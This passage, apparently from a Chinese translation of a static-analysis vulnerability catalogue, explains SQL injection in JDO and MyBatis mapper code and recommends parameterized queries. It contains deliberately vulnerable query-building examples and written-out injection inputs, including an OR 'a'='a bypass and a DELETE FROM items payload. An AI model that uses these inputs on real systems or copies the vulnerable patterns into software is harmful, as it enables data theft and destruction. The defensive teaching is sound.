<h5 id="REFERENCES-312"><a href="#REFERENCES-312" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] S. J. Friedl SQL Injection Attacks by Example</p>
<p>[2] P. Litwin Stop SQL Injection Attacks Before They Stop You MSDN Magazine</p>
<p>[3] P. Finnigan SQL Injection and Oracle, Part One Security Focus</p>
<p>[4] M. Howard, D. LeBlanc Writing Secure Code, Second Edition Microsoft Press</p>
<p>[5] Hibernate API Documentation</p>
<p>[6] IDS00-J. Prevent SQL Injection CERT</p>
<p>[7] INJECT-2: Avoid dynamic SQL Oracle</p>
<p>[8] INPUT-1: Validate inputs Oracle</p>
<p>[9] Standards Mapping - Common Weakness Enumeration CWE ID 564</p>
<p>[10] Standards Mapping - FIPS200 SI</p>
<p>[11] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[13] Standards Mapping - OWASP Top 10 2004 A6 Injection Flaws</p>
<p>[14] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws</p>
<p>[15] Standards Mapping - OWASP Top 10 2010 A1 Injection</p>
<p>[16] Standards Mapping - OWASP Top 10 2013 A1 Injection</p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.6</p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.2</p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1</p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[22] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[23] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 116</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002540 CAT I, APSC-DV-002560 CAT I</p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002540 CAT I, APSC-DV-002560 CAT I</p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002540 CAT I, APSC-DV-002560 CAT I</p>
<p>[34] Standards Mapping - Web Application Security Consortium 24 + 2 SQL Injection</p>
<p>[35] Standards Mapping - Web Application Security Consortium Version 2.00 SQL Injection (WASC-19)</p>
<h4 id="SQL-Injection-JDO"><a href="#SQL-Injection-JDO" class="headerlink" title="SQL Injection: JDO"></a>SQL Injection: JDO</h4><h5 id="ABSTRACT-315"><a href="#ABSTRACT-315" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>使用 Java 数据对象 (JDO) 执行通过不可信来源的输入构建的动态 SQL 或 JDOQL 指令，会让攻击者有机会篡改指令的含义或者执行任意 SQL 命令。</p>
<h5 id="EXPLANATION-316"><a href="#EXPLANATION-316" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>SQL injection 错误在以下情况下发生：</p>
<ol>
<li><p>数据从一个不可信赖的数据源进入程序。</p>
</li>
<li><p>数据用于动态地构造一个 SQL 或 JDOQL 查询。</p>
</li>
</ol>
<p>例 1：以下代码动态地构造并执行了一个 SQL 查询，该查询可以搜索与指定名称相匹配的项。该查询仅会显示条目所有者与被授予权限的当前用户一致的条目。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">	String userName = ctx.getAuthenticatedUserName();</span><br><span class="line"></span><br><span class="line">	String itemName = request.getParameter(&quot;itemName&quot;);</span><br><span class="line"></span><br><span class="line">	String sql = &quot;SELECT * FROM items WHERE owner = &apos;&quot;</span><br><span class="line"></span><br><span class="line">				+ userName + &quot;&apos; AND itemname = &apos;&quot;</span><br><span class="line"></span><br><span class="line">				+ itemName + &quot;&apos;&quot;;</span><br><span class="line"></span><br><span class="line">	Query query = pm.newQuery(Query.SQL, sql);</span><br><span class="line"></span><br><span class="line">	query.setClass(Person.class);</span><br><span class="line"></span><br><span class="line">	List people = (List)query.execute();</span><br><span class="line"></span><br><span class="line">	...</span><br></pre></td></tr></table></figure>
<p>这一代码所执行的查询遵循如下方式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM items</span><br><span class="line"></span><br><span class="line">WHERE owner = &lt;userName&gt;</span><br><span class="line"></span><br><span class="line">AND itemname = &lt;itemName&gt;;</span><br></pre></td></tr></table></figure>
<p>但是，由于这个查询是动态构造的，由一个不变的基查询字符串和一个用户输入字符串连接而成，因此只有在 itemName 不包含单引号字符时，才会正确执行这一查询。如果一个用户名为 wiley 的攻击者为 itemName 输入字符串“name’ OR ‘a’=’a”，那么查询就会变成：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM items</span><br><span class="line"></span><br><span class="line">WHERE owner = &apos;wiley&apos;</span><br><span class="line"></span><br><span class="line">AND itemname = &apos;name&apos; OR &apos;a&apos;=&apos;a&apos;;</span><br></pre></td></tr></table></figure>
<p>附加条件 OR ‘a’=’a’ 会使 where 从句永远评估为 true，因此该查询在逻辑上将等同于一个更为简化的查询：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM items;</span><br></pre></td></tr></table></figure>
<p>这种查询的简化会使攻击者绕过查询只返回经过验证的用户所拥有的条目的要求；而现在的查询则会直接返回所有储存在 items 表中的条目，不论它们的所有者是谁。</p>
<p>例 2：这个例子指出了将不同的恶意数值传递给在例 1 中构造和执行的查询时所带来的各种影响。如果一个用户名为 wiley 在 itemName 中输入字符串“name’; DELETE FROM items; –”，则该查询将会变为以下两个：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM items</span><br><span class="line"></span><br><span class="line">WHERE owner = &apos;wiley&apos;</span><br><span class="line"></span><br><span class="line">AND itemname = &apos;name&apos;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DELETE FROM items;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--&apos;</span><br></pre></td></tr></table></figure>
<p>众多数据库服务器，其中包括 Microsoft(R) SQL Server 2000，都可以一次性执行多条用分号分隔的 SQL 指令。对于那些不允许运行用分号分隔的批量指令的数据库服务器，比如 Oracle 和其他数据库服务器，攻击者输入的这个字符串只会导致错误；但是在那些支持这种操作的数据库服务器上，攻击者可能会通过执行多条指令而在数据库上执行任意命令。</p>
<p>注意成对的连字符 (–)；这在大多数数据库服务器上都表示下面的语句将作为注释使用，而不能加以执行 [4]。在这种情况下，注释字符的作用就是删除修改的查询指令中遗留的最后一个单引号。而在那些不允许这样加注注释的数据库中，通常攻击者可以如例 1 那样来攻击。如果攻击者输入字符串“name’); DELETE FROM items; SELECT * FROM items WHERE ‘a’=’a”就会创建如下三个有效指令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM items</span><br><span class="line"></span><br><span class="line">WHERE owner = &apos;wiley&apos;</span><br><span class="line"></span><br><span class="line">AND itemname = &apos;name&apos;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DELETE FROM items;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SELECT * FROM items WHERE &apos;a&apos;=&apos;a&apos;;</span><br></pre></td></tr></table></figure>
<p>避免 SQL injection 攻击的传统方法之一是，把它作为一个输入合法性检查的问题来处理，只接受列在白名单中的字符，或者识别并避免那些列在黑名单中的恶意数据。白名单方法是一种非常有效方法，它可以强制执行严格的输入检查规则，但是参数化的 SQL 指令所需维护更少，而且能提供更好的安全保障。而对于通常采用的列黑名单方式，由于总是存在一些小漏洞，所以并不能有效地防止 SQL injection 威胁。例如，攻击者可以：</p>
<p>— 把没有被黑名单引用的值作为目标</p>
<p>— 寻找方法以绕过对某一转义序列元字符的需要</p>
<p>— 使用存储过程来隐藏注入的元字符</p>
<p>手动去除 SQL 查询中的元字符有一定的帮助，但是并不能完全保护您的应用程序免受 SQL injection 攻击。</p>
<p>防范 SQL injection 攻击的另外一种常用方式是使用存储过程。虽然存储过程可以阻止某些类型的 SQL injection 攻击，但是对于绝大多数攻击仍无能为力。存储过程有助于避免 SQL injection 的常用方式是限制可作为参数传入的指令类型。但是，有许多方法都可以绕过这一限制，许多危险的表达式仍可以传入存储过程。再次重申，存储过程可以阻止某些类型的盗取行为，但是它们并不能保护您的应用程序免受 SQL Injection 攻击。</p>
<h5 id="RECOMMENDATIONS-314"><a href="#RECOMMENDATIONS-314" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>造成 SQL injection 攻击的根本原因在于攻击者可以改变 SQL 查询的上下文，使程序员原本要作为数据解析的数值，被篡改为命令了。当构造一个 SQL 查询时，程序员应当清楚，哪些输入的数据将会成为命令的一部分，而哪些仅仅是作为数据。参数化 SQL 指令可以防止直接窜改上下文，避免几乎所有的 SQL injection 攻击。参数化 SQL 指令是用常规的 SQL 字符串构造的，但是当需要加入用户输入的数据时，它们就需要使用捆绑参数，这些捆绑参数是一些占位符，用来存放随后插入的数据。换言之，捆绑参数可以使程序员清楚地分辨数据库中的数据，即其中有哪些输入可以看作命令的一部分，哪些输入可以看作数据。这样，当程序准备执行某个指令时，它可以详细地告知数据库，每一个捆绑参数所使用的运行时的值，而不会被解析成对该命令的修改。</p>
<p>前面的例子可以改成使用参数化 SQL 指令的攻击方式（替代用户输入连续的字符串），如下所示：</p>
<p>…<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">String userName = ctx.getAuthenticatedUserName();</span><br><span class="line"></span><br><span class="line">String itemName = request.getParameter(&quot;itemName&quot;);</span><br><span class="line"></span><br><span class="line">String sql =</span><br><span class="line"></span><br><span class="line">        &quot;SELECT * FROM items WHERE itemname=? AND owner=?&quot;;</span><br><span class="line"></span><br><span class="line">Query query = pm.newQuery(Query.SQL, sql);</span><br><span class="line"></span><br><span class="line">query.setClass(Person.class);</span><br><span class="line"></span><br><span class="line">List people = (List)query.execute(itemName, userName);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>更加复杂的情况常常出现在报表生成代码中，因为这时需要通过用户输入来改变 SQL 指令的命令结构，比如在 WHERE 条件子句中加入动态的约束条件。不要因为这一需求，就无条件地接受连续的用户输入，从而创建查询语句字符串。当必须要根据用户输入来改变命令结构时，可以使用间接的方法来防止 SQL injection 攻击：创建一个合法的字符串集合，使其对应于可能要加入到 SQL 指令中的不同元素。在构造一个指令时，可使用来自用户的输入，以便从应用程序控制的值集合中进行选择。</p>
<p>如果输入必须直接包含在指令中，就应当使用绑定参数。</p>
<h5 id="REFERENCES-313"><a href="#REFERENCES-313" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] S. J. Friedl SQL Injection Attacks by Example</p>
<p>[2] P. Litwin Stop SQL Injection Attacks Before They Stop You MSDN Magazine</p>
<p>[3] P. Finnigan SQL Injection and Oracle, Part One Security Focus</p>
<p>[4] M. Howard, D. LeBlanc Writing Secure Code, Second Edition Microsoft Press</p>
<p>[5] JDO API Documentation</p>
<p>[6] IDS00-J. Prevent SQL Injection CERT</p>
<p>[7] INJECT-2: Avoid dynamic SQL Oracle</p>
<p>[8] INPUT-1: Validate inputs Oracle</p>
<p>[9] Standards Mapping - Common Weakness Enumeration CWE ID 89</p>
<p>[10] Standards Mapping - FIPS200 SI</p>
<p>[11] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[13] Standards Mapping - OWASP Top 10 2004 A6 Injection Flaws</p>
<p>[14] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws</p>
<p>[15] Standards Mapping - OWASP Top 10 2010 A1 Injection</p>
<p>[16] Standards Mapping - OWASP Top 10 2013 A1 Injection</p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.6</p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.2</p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1</p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[22] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[23] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 089</p>
<p>[24] Standards Mapping - SANS Top 25 2010 Insecure Interaction - CWE ID 089</p>
<p>[25] Standards Mapping - SANS Top 25 2011 Insecure Interaction - CWE ID 089</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002540 CAT I, APSC-DV-002560 CAT I</p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002540 CAT I, APSC-DV-002560 CAT I</p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002540 CAT I, APSC-DV-002560 CAT I</p>
<p>[36] Standards Mapping - Web Application Security Consortium 24 + 2 SQL Injection</p>
<p>[37] Standards Mapping - Web Application Security Consortium Version 2.00 SQL Injection (WASC-19)</p>
<h4 id="SQL-Injection-MyBatis-Mapper"><a href="#SQL-Injection-MyBatis-Mapper" class="headerlink" title="SQL Injection: MyBatis Mapper"></a>SQL Injection: MyBatis Mapper</h4><h5 id="ABSTRACT-316"><a href="#ABSTRACT-316" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>通过不可信来源的输入构建动态 SQL 指令，攻击者就能够修改指令的含义或者执行任意 SQL 命令。</p>
<h5 id="EXPLANATION-317"><a href="#EXPLANATION-317" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>SQL injection 错误在以下情况下发生：</p>
<ol>
<li><p>数据从一个不可信赖的数据源进入程序。</p>
</li>
<li><p>数据用于动态地构造一个 SQL 查询。</p>
</li>
</ol>
<p>使用 MyBatis Mapper XML 文件可以指定 SQL 指令中的动态参数，通常使用 # 字符来定义它们，如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;select id=&quot;getItems&quot; parameterType=&quot;domain.company.MyParamClass&quot; resultType=&quot;MyResultMap&quot;&gt;</span><br><span class="line"></span><br><span class="line">    SELECT *</span><br><span class="line"></span><br><span class="line">    FROM items</span><br><span class="line"></span><br><span class="line">    WHERE owner = #&#123;userName&#125;</span><br><span class="line"></span><br><span class="line">&lt;/select&gt;</span><br></pre></td></tr></table></figure>
<p>变量名称周围带有括号的 # 字符表示 MyBatis 将使用 userName 变量创建参数化查询。但是，MyBatis 还允许使用 $ 字符将变量直接连接到 SQL 指令，使其易受 SQL injection 攻击。</p>
<p>例 1：以下代码动态地构造并执行了一个 SQL 查询，该查询可以搜索与指定名称相匹配的项。该查询仅会显示条目所有者与被授予权限的当前用户一致的条目。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;select id=&quot;getItems&quot; parameterType=&quot;domain.company.MyParamClass&quot; resultType=&quot;MyResultMap&quot;&gt;</span><br><span class="line"></span><br><span class="line">    SELECT *</span><br><span class="line"></span><br><span class="line">    FROM items</span><br><span class="line"></span><br><span class="line">    WHERE owner = #&#123;userName&#125;</span><br><span class="line"></span><br><span class="line">    AND itemname = $&#123;itemName&#125;</span><br><span class="line"></span><br><span class="line">&lt;/select&gt;</span><br></pre></td></tr></table></figure>
<p>但是，由于这个查询是动态构造的，由一个不变的基查询字符串和一个用户输入字符串连接而成，因此只有在 itemName 不包含单引号字符时，才会正确执行这一查询。如果一个用户名为 wiley 的攻击者为 itemName 输入字符串“name’ OR ‘a’=’a”，那么查询就会变成：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM items</span><br><span class="line"></span><br><span class="line">WHERE owner = &apos;wiley&apos;</span><br><span class="line"></span><br><span class="line">AND itemname = &apos;name&apos; OR &apos;a&apos;=&apos;a&apos;;</span><br></pre></td></tr></table></figure>
<p>附加条件 OR ‘a’=’a’ 会使 WHERE 从句的计算结果始终为 true，因此该查询在逻辑上将等同于一个更为简化的查询：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM items;</span><br></pre></td></tr></table></figure>
<p>这种查询的简化会使攻击者绕过查询只应返回经过验证的用户所拥有的条目的要求；而现在的查询则会直接返回所有储存在 items 表中的条目，不论它们的所有者是谁。</p>
<p>例 2：这个例子指出了将不同的恶意数值传递给在例 1 中构造和执行的查询时所带来的各种影响。如果一个用户名为 wiley 在 itemName 中输入字符串“name’; DELETE FROM items; –”，则该查询将会变为以下两个：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM items</span><br><span class="line"></span><br><span class="line">WHERE owner = &apos;wiley&apos;</span><br><span class="line"></span><br><span class="line">AND itemname = &apos;name&apos;;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">DELETE FROM items;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">--&apos;</span><br></pre></td></tr></table></figure>
<p>众多数据库服务器，其中包括 Microsoft(R) SQL Server 2000，都可以一次性执行多条用分号分隔的 SQL 指令。对于那些不允许运行用分号分隔的批量指令的数据库服务器，比如 Oracle 和其他数据库服务器，攻击者输入的这个字符串只会导致错误；但是在那些支持这种操作的数据库服务器上，攻击者可能会通过执行多条指令而在数据库上执行任意命令。</p>
<p>注意成对的连字符 (–)；这在大多数数据库服务器上都表示下面的语句将作为注释使用，而不能加以执行 [4]。在这种情况下，注释字符的作用就是删除修改的查询指令中遗留的最后一个单引号。而在那些不允许这样加注注释的数据库中，通常攻击者可以如例 1 那样来攻击。如果攻击者输入字符串“name’); DELETE FROM items; SELECT * FROM items WHERE ‘a’=’a”就会创建如下三个有效指令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM items</span><br><span class="line"></span><br><span class="line">WHERE owner = &apos;wiley&apos;</span><br><span class="line"></span><br><span class="line">AND itemname = &apos;name&apos;;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">DELETE FROM items;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">SELECT * FROM items WHERE &apos;a&apos;=&apos;a&apos;;</span><br></pre></td></tr></table></figure>
<p>避免 SQL injection 攻击的传统方法之一是，把它作为一个输入合法性检查的问题来处理，只接受列在白名单中的字符，或者识别并避免那些列在黑名单中的恶意数据。白名单方法是一种非常有效方法，它可以强制执行严格的输入检查规则，但是参数化的 SQL 指令所需维护更少，而且能提供更好的安全保障。而对于通常采用的列黑名单方式，由于总是存在一些小漏洞，所以并不能有效地防止 SQL injection 威胁。例如，攻击者可以：</p>
<p>— 把没有被黑名单引用的值作为目标</p>
<p>— 寻找方法以绕过对某一转义序列元字符的需要</p>
<p>— 使用存储过程来隐藏注入的元字符</p>
<p>手动去除 SQL 查询中的元字符有一定的帮助，但是并不能确保应用程序免受 SQL injection 攻击。</p>
<p>防范 SQL injection 攻击的另外一种常用方式是使用存储过程。虽然存储过程可以阻止某些类型的 SQL injection 攻击，但是对于绝大多数攻击仍无能为力。存储过程有助于避免 SQL injection 的常用方式是限制可作为参数传入的指令类型。但是，有许多方法都可以绕过这一限制，许多危险的表达式仍可以传入存储过程。所以再次强调，存储过程在某些情况下可以避免这种攻击，但是并不能完全保护您的应用系统抵御 SQL injection 的攻击。</p>
<h5 id="RECOMMENDATIONS-315"><a href="#RECOMMENDATIONS-315" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>造成 SQL injection 攻击的根本原因在于攻击者可以改变 SQL 查询的上下文，使程序员原本要作为数据解析的数值，被篡改为命令了。当构造一个 SQL 查询时，程序员应当清楚，哪些输入的数据将会成为命令的一部分，而哪些仅仅是作为数据。参数化 SQL 指令可以防止直接窜改上下文，避免几乎所有的 SQL injection 攻击。参数化 SQL 指令是用常规的 SQL 字符串构造的，但是当需要加入用户输入的数据时，它们就需要使用捆绑参数，这些捆绑参数是一些占位符，用来存放随后插入的数据。换言之，捆绑参数可以使程序员清楚地分辨数据库中的数据，即其中有哪些输入可以看作命令的一部分，哪些输入可以看作数据。这样，当程序准备执行某个指令时，它可以详细地告知数据库，每一个捆绑参数所使用的运行时的值，而不会被解析成对该命令的修改。</p>
<p>例 3：可以将例 1 重写为使用参数化 SQL 指令（替代用户输入连续的字符串），如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;select id=&quot;getItems&quot; parameterType=&quot;domain.company.MyParamClass&quot; resultType=&quot;MyResultMap&quot;&gt;</span><br><span class="line"></span><br><span class="line">    SELECT *</span><br><span class="line"></span><br><span class="line">    FROM items</span><br><span class="line"></span><br><span class="line">    WHERE owner = #&#123;userName&#125;</span><br><span class="line"></span><br><span class="line">    AND itemname = #&#123;itemName&#125;</span><br><span class="line"></span><br><span class="line">&lt;/select&gt;</span><br></pre></td></tr></table></figure>
<p>更加复杂的情况常常出现在报表生成代码中，因为这时需要通过用户输入来改变 SQL 指令的命令结构，比如在 WHERE 条件子句中加入动态的约束条件。不要因为这一需求，就无条件地接受连续的用户输入，从而创建查询语句字符串。MyBatis 包含了对在其 XML 架构中构建动态查询进行解释的功能，同时还提供使用参数化查询 [2] 的功能。</p>
<p>例 4：可以将例 3 改写为 XML 中的动态查询，以首先验证 itemName 是否存在，同时仍然使用参数化查询，例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;select id=&quot;getItems&quot; parameterType=&quot;domain.company.MyParamClass&quot; resultType=&quot;MyResultMap&quot;&gt;</span><br><span class="line"></span><br><span class="line">    SELECT *</span><br><span class="line"></span><br><span class="line">    FROM items</span><br><span class="line"></span><br><span class="line">    WHERE owner = #&#123;userName&#125;</span><br><span class="line"></span><br><span class="line">    &lt;if test=&quot;itemName != null&quot;&gt;</span><br><span class="line"></span><br><span class="line">        AND itemname = #&#123;itemName&#125;</span><br><span class="line"></span><br><span class="line">    &lt;/if&gt;</span><br><span class="line"></span><br><span class="line">&lt;/select&gt;</span><br></pre></td></tr></table></figure>
<p>通过这种方法创建动态查询可以防止由于维持参数化查询的安全而导致的 SQL injection 攻击，从而使其比字符串串联更安全、更易于维护。如果这种方法出于任何原因不可用或不足够，当必须要根据用户输入来改变命令结构时，可以使用间接的方法来防止 SQL injection 攻击：创建一个合法的字符串集合，使其对应于可能要加入到 SQL 指令中的不同元素。在构造一个指令时，可使用来自用户的输入，以便从应用程序控制的值集合中进行选择。</p>
<h5 id="REFERENCES-314"><a href="#REFERENCES-314" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] MyBatis MyBatis 3 | Mapper XML Files</p>
<p>[2] MyBatis MyBatis 3 | Dynamic SQL</p>
<p>[3] S. J. Friedl SQL Injection Attacks by Example</p>
<p>[4] P. Litwin Stop SQL Injection Attacks Before They Stop You MSDN Magazine</p>
<p>[5] P. Finnigan SQL Injection and Oracle, Part One Security Focus</p>
<p>[6] M. Howard, D. LeBlanc Writing Secure Code, Second Edition Microsoft Press</p>
<p>[7] IDS00-J. Prevent SQL Injection CERT</p>
<p>[8] INJECT-2: Avoid dynamic SQL Oracle</p>
<p>[9] Standards Mapping - Common Weakness Enumeration CWE ID 89</p>
<p>[10] Standards Mapping - FIPS200 SI</p>
<p>[11] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[13] Standards Mapping - OWASP Top 10 2004 A6 Injection Flaws</p>
